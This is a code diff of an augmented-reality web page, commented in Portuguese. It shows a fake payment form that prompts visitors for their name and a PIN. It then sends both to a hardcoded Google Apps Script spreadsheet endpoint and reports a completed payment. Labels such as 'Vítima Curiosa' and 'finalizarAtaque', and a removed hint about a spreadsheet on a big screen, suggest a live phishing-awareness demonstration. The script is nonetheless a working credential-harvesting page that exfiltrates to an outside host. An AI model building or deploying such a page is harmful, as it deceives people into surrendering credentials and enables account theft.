@@ -58,56 +58,71 @@
     </a-scene>
 
     <script>
-      let senhaColetada = "";
-      let nomeUsuario = "";
-      
-      // COLOQUE SEU LINK AQUI ABAIXO
-      const linkPlanilha = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";
+  let senhaColetada = "";
+  let nomeUsuario = "";
+  const linkPlanilha = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";
 
-      function abrirPainel() {
-        // Abre o teclado real do celular para o nome
-        nomeUsuario = prompt("Para continuar com o pagamento, digite seu NOME:");
-        
-        if (!nomeUsuario) nomeUsuario = "Vítima Curiosa";
+  function abrirPainel() {
+    // 1. Pede o nome
+    let entrada = prompt("Para confirmar o pagamento, digite seu NOME:");
+    
+    if (!entrada) {
+        nomeUsuario = "Vítima Curiosa";
+    } else {
+        nomeUsuario = entrada;
+    }
 
+    // 2. O PULO DO GATO: Espera 500ms para o teclado do celular sumir 
+    // e o navegador voltar a focar na câmera antes de mostrar o form.
+    setTimeout(function() {
+        console.log("Retomando AR após entrada de nome...");
         document.querySelector('#fake-form').setAttribute('visible', 'true');
         document.querySelector('#malicious-overlay').setAttribute('visible', 'false');
         
-        // Acorda o sistema de clique para o novo painel
-        document.querySelector('[cursor]').components.raycaster.refreshObjects();
-      }
+        // Força o sistema de clique a se recalibrar
+        const cursor = document.querySelector('[cursor]');
+        if (cursor && cursor.components.raycaster) {
+            cursor.components.raycaster.refreshObjects();
+        }
+    }, 500); 
+  }
 
-      function registrarDigito(num) {
-        senhaColetada += num;
-        document.querySelector('#pass-display').setAttribute('value', '*'.repeat(senhaColetada.length));
-        
-        // Efeito visual de clique
-        const el = event.target;
-        el.setAttribute('color', '#888');
-        setTimeout(() => el.setAttribute('color', '#444'), 100);
-      }
+  function registrarDigito(num) {
+    senhaColetada += num;
+    document.querySelector('#pass-display').setAttribute('value', '*'.repeat(senhaColetada.length));
+    
+    // Feedback visual do botão
+    const el = event.target;
+    el.setAttribute('color', '#888');
+    setTimeout(() => el.setAttribute('color', '#444'), 100);
+  }
 
-      function finalizarAtaque() {
-        if (senhaColetada.length === 0) return;
+  function finalizarAtaque() {
+    if (senhaColetada.length === 0) return;
 
-        document.querySelector('#pass-display').setAttribute('value', 'ENVIANDO...');
+    document.querySelector('#pass-display').setAttribute('value', 'ENVIANDO...');
 
-        // Enviando Nome e Senha para a Planilha
-        fetch(`${linkPlanilha}?nome=${encodeURIComponent(nomeUsuario)}&senha=${senhaColetada}`, {
-          method: 'POST',
-          mode: 'no-cors'
-        })
-        .then(() => {
-          alert("🚨 PAGAMENTO CONCLUÍDO!\n\nObrigado, " + nomeUsuario.toUpperCase() + ".\n\n(Dica: Olhe para a planilha no telão agora!)");
-          
-          // Reseta para a próxima pessoa
-          senhaColetada = "";
-          nomeUsuario = "";
-          document.querySelector('#pass-display').setAttribute('value', 'DIGITE...');
-          document.querySelector('#fake-form').setAttribute('visible', 'false');
-          document.querySelector('#malicious-overlay').setAttribute('visible', 'true');
-        });
-      }
-    </script>
+    const linkFinal = `${linkPlanilha}?nome=${encodeURIComponent(nomeUsuario)}&senha=${senhaColetada}`;
+
+    fetch(linkFinal, {
+      method: 'POST',
+      mode: 'no-cors'
+    })
+    .then(() => {
+      alert("🚨 PAGAMENTO CONCLUÍDO!\n\nObrigado, " + nomeUsuario.toUpperCase());
+      
+      // Reseta tudo para a próxima pessoa
+      senhaColetada = "";
+      nomeUsuario = "";
+      document.querySelector('#pass-display').setAttribute('value', 'DIGITE...');
+      document.querySelector('#fake-form').setAttribute('visible', 'false');
+      document.querySelector('#malicious-overlay').setAttribute('visible', 'true');
+    })
+    .catch(err => {
+      console.error(err);
+      alert("Erro ao enviar. Tente novamente.");
+    });
+  }
+</script>
   </body>
 </html>
